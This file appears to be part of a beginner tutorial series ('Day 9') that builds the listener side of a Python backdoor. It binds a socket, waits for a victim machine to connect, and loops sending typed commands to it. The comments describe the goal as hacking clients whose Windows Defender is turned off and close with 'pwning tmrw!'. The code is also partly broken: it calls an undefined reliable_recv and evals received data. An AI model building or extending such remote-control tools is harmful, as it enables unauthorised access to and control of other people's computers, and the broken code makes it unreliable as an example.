# Day 9 - Creating the Shell
# 1     Before we proceed to make the shell, let's think what are the commands that we needed for our goal.
#       the common one's are 'cd' for changing directory and 'ls' for listing all the items in current directory.
#       Additionally, we are going to create 'clear' and 'quit'
      
import socket
import json
import subprocess # 2
import os # 2

def ip_address():
    global server_ip
    serv_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_ip.connect(("8.8.8.8", 80))
    server_ip = serv_ip.getsockname()[0]
    serv_ip.close()
    return server_ip

#########################

server_ip = ip_address() 
server_port = 5555 

#########################

def json_send(data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def json_recv(size=1024):
    data = ''
    while True:
        try:
            data += client.recv(size).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def message_send(string, size=8):
    no_str = False
    if type(string) != str:
        string =str(string)
        no_str = True
    body = string.encode()
    length = len(body)
    header = str(length).encode()
    header += b' ' * (size - len(header))
    client.send(header)
    client.send(body)
    if no_str == True:
        client.send('T'.encode())
    else:
        client.send('F'.encode())

def message_recv(size=8):
    while True:
        header = client.recv(size).decode()
        if header:
            body_size = int(header)
            body = client.recv(body_size).decode()
            no_str = client.recv(1).decode()
            break
    if no_str == 'T':
        body = eval(body)
    return body
    

def shell(): # 4
    while True: # 5
        command = input('Command Here: ') # 6
        json_send(command) # 7
        if command == 'cd':
            pass
        elif command == 'ls':
            pass
        elif command == 'clear':
            pass
        elif command == 'quit':
            break # 8
        else: # 14
            result = reliable_recv() # 15
            print(result)   




def connection():
    global server,client,ip
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip,server_port))
    server.listen(5)
    #####   DELETABLE   #####
    from pathlib import Path     
    exec(Path('client.py').read_text())
    #####   DELETABLE   #####
    client, ip = server.accept()
    shell() # 3

connection()



#########################

# 2     before we start, we are going to add 2 new modules for this lecture. The os and subprocess module.
# 3     calling the shell function inside the connection()
# 4     new fucntion
# 5     imagine how the terminal works, or even the command prompt in windows.. whenever you typed a commmand, there will be another available input for your next command.
#       that's why we are making the shell always 'True'
# 6     I assume that you already know these next codes.
# 7     we are going to send the 
# 8     if the input is quit. we have to stop the code immediately.
# 14    we are adding one more recurse. Like what we did in the client.py, if nothing is selected from ['cd', 'ls',' 'clear', 'quit'], 
#       then it means that, we have wrote a command for the command prompt in the backdoor and we are expecting to get a output.
# 15    we are going to assign it to 'result'
# 16    and we are going to print it.

#       now we have managed to create the backdoor. we can now hack any clients with a low security protection. (turned off windows defender)

#########################

# pwning tmrw!